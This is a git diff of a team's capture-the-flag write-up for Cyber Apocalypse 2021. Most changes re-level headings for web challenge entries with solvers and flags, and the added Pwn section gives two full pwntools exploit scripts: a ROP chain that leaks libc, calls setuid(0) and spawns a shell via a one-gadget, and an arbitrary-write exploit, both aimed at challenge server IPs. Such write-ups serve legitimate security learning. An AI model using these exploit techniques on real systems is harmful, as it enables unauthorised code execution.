@@ -1,4 +1,5 @@
 # Cyber Apocalypse 2021
+
 The CTF was active from 19 Apr, 2021 22:00 until 24 Apr, 2021 08:00.
 
 Participants: sinfulz, Fugl, Legacyy, Pwning, payl0ad, x3ph, bread, firedank.
@@ -30,11 +31,11 @@ Participants: sinfulz, Fugl, Legacyy, Pwning, payl0ad, x3ph, bread, firedank.
 | PhaseStream 3| OSINT        | 225 |CHTB{}|
 | PhaseStream 4        | Mobile        | 400           |               | 
 
-
+# Web
 
 ##
 
-# BlitzProp
+## BlitzProp
 
 Solved By: bread
 found similar chal, which points to [https://blog.p6.is/AST-Injection/#Pug](https://blog.p6.is/AST-Injection/#Pug)
@@ -73,13 +74,13 @@ CHTB{p0llute_with_styl3}
 
 ##
 
-# Inspector Gadget
+## Inspector Gadget
 
 Solved By: pwning
 
 ##
 
-# DaaS
+## DaaS
 
 Solved By: FireHawk
 
@@ -102,13 +103,13 @@ CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}
 
 ##
 
-# MiniSTRyplace
+## MiniSTRyplace
 
 Solved By:
 
 ##
 
-# Caas
+## Caas
 
 Solved By: PJ
 
@@ -120,7 +121,7 @@ CHTB{f1le_r3trieval_4s_a_s3rv1ce}
 ```
 ##
 
-# Wild Goose Hunt
+## Wild Goose Hunt
 
 Solved By: Legacyy & PJ
 
@@ -155,25 +156,25 @@ while password[-1] != "}":
 
 ##
 
-# E.Tree
+## E.Tree
 
 Solved By: Legacyy?
 
 ##
 
-# Wild Goose Hunt
+## Wild Goose Hunt
 
 Solved By: Legacyy & PJ
 
 ##
 
-# Extortion
+## Extortion
 
 Solved By: ?
 
 ##
 
-# The Galatic Times
+## The Galatic Times
 
 Solved By: Legacyy
 
@@ -212,7 +213,7 @@ CHTB{th3_wh1t3l1st3d_CND_str1k3s_b4ck}
 ```
 ##
 
-# Cessation
+## Cessation
 
 Solved By: bread
 
@@ -234,13 +235,13 @@ CHTB{c3ss4t10n_n33dsync1ng#@$?}
 
 ##
 
-# emoji voting
+## emoji voting
 
 Solved By: bread
 
 ##
 
-# Alien compliant form
+## Alien compliant form
 
 Solved By: Legacyy
 
@@ -250,7 +251,7 @@ Solved By: Legacyy
 
 ##
 
-# Starfleet
+## Starfleet
 
 Solved By: Legacyy
 
@@ -280,7 +281,7 @@ CHTB{I_can_f1t_my_p4yl04ds_3v3rywh3r3!}
 
 ##
 
-# Bug Report
+## Bug Report
 
 Solved By: Legacyy
 
@@ -317,4 +318,101 @@ And there we have the flag!
 
 ```
 CHTB{th1s_1s_my_bug_r3p0rt}
+```
+# Pwn
+
+##
+
+## Controller
+
+Solved By: bread
+
+```python
+from pwn import *
+from one_gadget import generate_one_gadget
+
+onegadget = next(generate_one_gadget('./libc.so.6'))
+    
+#p = process("./controller")
+p = remote('165.227.228.41', 32435)
+elf = ELF("./controller")
+libc = ELF("./libc.so.6")
+
+MAIN = elf.symbols['main']
+PUTS = elf.plt['puts']
+POPRDI = 0x4011d3
+FUNC_GOT = elf.got["exit"]
+padding = b"A" * 40
+
+#####
+# leak libc
+#######
+
+payload = padding + p64(POPRDI) + p64(FUNC_GOT) + p64(PUTS) + p64(MAIN)
+
+p.sendlineafter(":", "-182 -359")
+p.sendlineafter(">", "3")
+p.sendlineafter(">", payload)
+p.recvline()
+
+leak = u64(p.recvline().strip().ljust(8, b"\x00"))
+log.info(f"Leaked LIBC address, puts: {hex(leak)}")
+
+libc.address = leak - libc.symbols['exit']
+log.info(f"LIBC base @ {hex(libc.address)}")
+
+# get libc stuff
+BINSH = next(libc.search(b"/bin/sh"))
+SYSTEM = libc.sym["system"]
+EXIT = libc.sym["exit"]
+
+####
+# Exploit
+###
+
+# setuid(0)
+payload += padding + p64(POPRDI) + p64(0x0) + p64(libc.symbols['setuid']) + p64(elf.symbols['main'])
+p.sendlineafter(":", "-182 -359")
+p.sendlineafter(">", "3")
+p.sendlineafter(">", payload)
+
+log.info(f"POP_RDI {hex(POPRDI)}")
+log.info(f"bin/sh {hex(BINSH)}")
+log.info(f"system {hex(SYSTEM)}")
+log.info(f"exit {hex(EXIT)}")
+
+# One gadget not system("/bin/sh")
+payload = padding +  p64(libc.address + onegadget) # p64(POPRDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)
+p.sendlineafter(":", "-182 -359")
+p.sendlineafter(">", "3")
+p.sendlineafter(">", payload)
+p.interactive()
+```
+
+```
+CHTB{1nt3g3r_0v3rfl0w_s4v3d_0ur_r3s0urc3s}
+```
+
+##
+
+## Minefield
+
+Solved By: bread
+
+```python
+from pwn import *
+
+#p = process("./minefield")
+p = remote('188.166.145.178', 32457)
+elf = ELF("./minefield")
+
+p.sendlineafter(">", "2")
+p.sendlineafter(":", str(int("601078",16))) # where
+p.sendlineafter(":", str(elf.symbols["_"])) # what
+# 2 x strtoull plus *puVar1 = uVar2;  ===   # write
+p.interactive()                             # flag
+```
+
+```
+CHTB{d3struct0r5_m1n3f13ld}
 ```
